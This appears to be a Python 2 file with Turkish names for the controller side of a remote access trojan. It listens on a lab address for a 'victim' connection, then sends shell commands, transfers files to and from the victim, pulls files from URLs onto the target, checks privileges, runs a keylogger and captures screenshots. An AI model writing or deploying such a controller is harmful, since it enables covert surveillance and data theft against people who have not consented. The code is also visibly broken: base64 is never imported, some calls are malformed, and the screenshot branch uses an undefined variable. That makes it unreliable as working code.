#!/usr/bin/env python	
#-*-coding:UTF-8-*-

import socket 
from colorama import Fore, Back, init, Style
init(autoreset="true")
import json

def verigonder(data):
	j_data=json.dumps(data)
	kurban.send(j_data)

def verial():
	j_data = " "
	while True:
		try:
			j_data=j_data+kurban.recv(1024)
			return json.loads(j_data)
		except ValueError:
			continue

def baglanti():
	global soket
	global ip
	global kurban
	soket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	soket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	soket.bind(("10.0.2.10", 7778))
	soket.listen(5)
	print(Fore.WHITE+ "Kurbanın Bağlantısı Bekleniyor")
	kurban, ip=soket.accept()
	print(Fore.GREEN+ "Kurban İle Bağlantı Sağlandı")
	print(Fore.BLUE+ "Kurban %s" % str(ip))
	print(Back.BLACK+ Fore.YELLOW+ "Yardım için y veya yardım yazın")

def yardim():
	print(Style.BRIGHT+Fore.CYAN+"*" *40)
	print(Style.DIM+ Fore.MAGENTA+"0 "+Fore.GREEN+ "==> Çıkış Yap")
	print(Style.DIM+ Fore.MAGENTA+"cd [X/Y] "+Fore.GREEN+ "==> X/Y Yoluna Git")
	print(Style.DIM+ Fore.MAGENTA+"indir [x] "+Fore.GREEN+ "==> Hedef Konumdaki x Dosyasını Yükle")
	print(Style.DIM+ Fore.MAGENTA+"yükle [x] "+Fore.GREEN+ "==> Hedef Cihazda X Dosyasını Yükle")
	print(Style.DIM+ Fore.MAGENTA+"webyukle [url] "+Fore.GREEN+ "==> URL Üzerinden Hedef Cihaza Dosya İndir")
	print(Style.DIM+ Fore.MAGENTA+"kontrol" +Fore.GREEN+"==> Ayrıcalıklarını Kontrol Et")
	print(Style.DIM+ Fore.MAGENTA+"keylog_start "+Fore.GREEN+" ==> Keylogger'ı Başlat")	
	print(Style.DIM+ Fore.MAGENTA+"keylog_oku "+Fore.GREEN+" ==> Keylogger Dosyasını Oku")
	print(Style.BRIGHT+ Fore.CYAN+"-" *40)
	print(Style.DIM+ Fore.MAGENTA+"Yukarıdakiler haricinde yazdığın kodlar\n hedefin terminalinde" +Fore.RED+"çalıştırılamadı")
	print(Style.BRIGHT+ Fore.CYAN+"*" *61)
	print("")

def komutlar():
	while True:
		kod=raw_input("Komut: ")
		verigonder(kod)
		if kod =="0":
			print(Back.RED+ "Server'dan çıkarıldı")
			break
		elif kod[:2]=="cd" and len(kod)>1:
			continue
		elif kod[:5] =="indir":
			try:
				dosya=open(kod[6:], "ab")
				verigonder(base64.b64.decode(dosya.read()))
			except:
				continue
		elif kod[:5]=="yükle":
			try:
				while True:
					dosyaismi(kod[6:])
					data = kurban.recv(1024)
					dosya = open(dosyaismi,'rb')
					x= dosya.read(1024)
					while(x):
						kurban.send(x)
						x = dosya.read(1024)
            				dosya.close()
					break
			except:
				continue
		elif kod[:8]=="webindir":
			continue
		elif kod=="ekranresmi":
			try:	
				s=0
				with open("ekranresmi"+str(s),"ab") as ekran:
					resim=verial()
					decode_resim=base64.b64decode(resim)
					if decode_resim[:4]=="HATA":
						print(encode_resim)
					else:
						ekran.write(encode_resim)
						s+=s
			except:	
				continue
		elif (kod=="y" or kod=="yardim"):
			yardim()
		elif kod=="keylog_baslat":
			continue			
		else:
			sonuc=verial()
			print(Fore.YELLOW+ sonuc)
baglanti()
komutlar()
soket.close()